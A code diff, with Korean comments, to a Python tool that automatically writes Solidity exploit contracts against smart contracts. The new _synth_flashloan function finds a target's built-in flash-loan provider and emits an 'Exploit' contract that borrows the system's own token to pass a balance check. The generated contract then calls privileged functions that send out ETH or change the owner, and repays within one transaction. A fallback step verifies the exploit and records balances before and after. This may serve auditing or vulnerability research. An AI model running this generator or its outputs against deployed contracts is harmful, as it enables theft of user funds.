@@ -1530,6 +1530,85 @@ def _synth_amm(target_src, name):
     return out
 
 
+def _synth_flashloan(target_src, name):
+    """시스템 내부에 플래시론 제공자(토큰을 caller 에 빌려주고 콜백 후 상환을
+    요구)가 있으면, 이를 이용해 '잔액이 큰 사람만' 호출 가능한 특권 함수를 단일
+    트랜잭션에서 뚫는 차용자(borrower)를 합성한다. ERC-3156 유사 단순형을 다룬다."""
+    src = _strip_comments(target_src)
+    bodies = _contract_bodies(src)
+    if name not in bodies:
+        return []
+    contracts = set(bodies)
+    tb = bodies[name]
+    # 타깃의 토큰형 게터 (Type public g; where Type has transfer/balanceOf)
+    def is_token(b): return ("transfer" in b and "balanceOf" in b)
+    token_types = {c for c,b in bodies.items() if is_token(b)}
+    getters = {}
+    for tm in re.finditer(r"\b(\w+)\s+public\s+(?:immutable\s+|constant\s+)?(\w+)\s*;", tb):
+        if tm.group(1) in contracts:
+            getters[tm.group(2)] = tm.group(1)
+    tok_getters = [g for g,t in getters.items() if t in token_types]
+    if not tok_getters:
+        return []
+    # 플래시론 제공자: uint 1개 인자 + 본문에 <tok>.transfer(msg.sender,...) + msg.sender 콜백 + balanceOf(address(this)) 상환검사
+    provider = None; cb = None; tok_getter = None
+    for f in _functions(tb):
+        b = f["body"]
+        if not (len(f["args"]) == 1 and f["args"][0][0].startswith("uint")):
+            continue
+        mt = re.search(r"(\w+)\s*\.\s*transfer\s*\(\s*msg\.sender", b)
+        mc = re.search(r"\w+\s*\(\s*msg\.sender\s*\)\s*\.\s*(\w+)\s*\(", b)
+        if mt and mc and re.search(r"balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)", b):
+            var = mt.group(1)
+            if var in getters and getters[var] in token_types:
+                provider, cb, tok_getter = f["name"], mc.group(1), var
+                break
+    if not provider:
+        return []
+    # 특권 행동 후보: 제공자가 아닌 external 함수 중 ETH 를 밖으로 보내거나 owner 를 바꾸는 것
+    actions = []
+    for f in _functions(tb):
+        if f["name"] == provider or not f.get("external"):
+            continue
+        b = f["body"]
+        if re.search(r"\.call\s*\{\s*value\s*:", b) or re.search(r"\bowner\s*=", b):
+            a = f["args"]
+            if len(a) == 0:
+                actions.append((f["name"], "()", ""))
+            elif len(a) == 1 and a[0][0] == "address":
+                actions.append((f["name"], "(address)", "payable(address(this))"))
+    if not actions:
+        return []
+    out = []
+    for (afn, asig, aarg) in actions[:4]:
+        code = (HEADER +
+            "// Strategy: flash-loan borrower — borrow the system's own token to meet a\n"
+            "// balance-gated privileged action in one tx, act, then repay the loan.\n"
+            "interface ITok { function transfer(address,uint256) external returns (bool);\n"
+            "                 function balanceOf(address) external view returns (uint256); }\n"
+            "interface IVault {\n"
+            f"    function {provider}(uint256) external;\n"
+            f"    function {tok_getter}() external view returns (address);\n"
+            f"    function {afn}{asig} external;\n"
+            "}\n\n"
+            "contract Exploit {\n"
+            "    address vault; address tok;\n"
+            "    function run(address _t) external payable {\n"
+            "        vault = _t; tok = IVault(_t).%s();\n" % tok_getter +
+            "        uint256 amt = ITok(tok).balanceOf(_t);\n"
+            "        require(amt > 0, \"no loanable\");\n"
+            f"        IVault(_t).{provider}(amt);\n"
+            "    }\n"
+            f"    function {cb}(uint256 amount) external {{\n"
+            f"        IVault(vault).{afn}({aarg});\n"
+            "        ITok(tok).transfer(msg.sender, amount);\n"
+            "    }\n"
+            "    receive() external payable {}\n"
+            "}\n")
+        out.append((f"flashloan:{provider}→{afn}", code))
+    return out
+
+
 def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_step, t0):
     # 0) 재진입 합성: 소스에서 유도한 (예치→인출) 공격 컨트랙트를 하네스로 검증
     try:
@@ -1570,6 +1649,27 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
                         "balance_before_wei":meta.get("balance_before_wei"),
                         "balance_after_wei":meta.get("balance_after_wei"),
                         "note":"템플릿 미매치 → 다중 컨트랙트 AMM 조작(플래시론식)을 합성해 성립시켰습니다.",
+                        "ms":int((time.time()-t0)*1000)}
+    except Exception:
+        pass
+    # 0c) 플래시론 차용자 합성 (잔액-게이트 특권 함수)
+    try:
+        for label, ex in _synth_flashloan(target_src, name):
+            try:
+                if do_verify and invariants_src:
+                    proven, vsteps, meta = _verify_attempt(name, target_src, invariants_src, ex, manifest)
+                else:
+                    proven, vsteps, meta = _run_effect(name, target_src, ex, manifest)
+            except Exception:
+                continue
+            if proven:
+                gen = {"step":"generate","title":"Exploit.sol 생성 (flashloan)","strategy":label,"exploit_src":ex}
+                return {"name":name,"proven":True,"firstViolated":meta.get("firstViolated",""),
+                        "strategy":label,"steps":[scan_step,gen]+vsteps,"exploit_src":ex,
+                        "mode":("verify" if (do_verify and invariants_src) else "effect"),
+                        "balance_before_wei":meta.get("balance_before_wei"),
+                        "balance_after_wei":meta.get("balance_after_wei"),
+                        "note":"템플릿 미매치 → 시스템 내부 플래시론을 이용한 차용자를 합성해 성립시켰습니다.",
                         "ms":int((time.time()-t0)*1000)}
     except Exception:
         pass
